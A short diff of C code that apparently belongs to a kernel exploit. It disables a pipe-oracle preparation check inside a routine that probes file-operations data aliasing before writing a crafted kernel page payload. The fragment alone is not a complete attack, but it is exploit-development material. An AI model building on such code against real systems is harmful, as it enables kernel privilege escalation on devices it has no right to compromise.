@@ -256,12 +256,12 @@ static int verify_fops_data_alias_before_production(void) {
       fops_data_probe_active = 1;
       if (prepare_oracle) {
         reset_pipe_attempt();
-        if (!prepare_p0_pipe_oracle()) {
+        /*if (!prepare_p0_pipe_oracle()) {
           pr_error("fops data alias pipe preparation failed candidate=%s\n",
                    names[index]);
           abort_verification = 1;
           break;
-        }
+        }*/
         prepare_oracle = 0;
       }
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
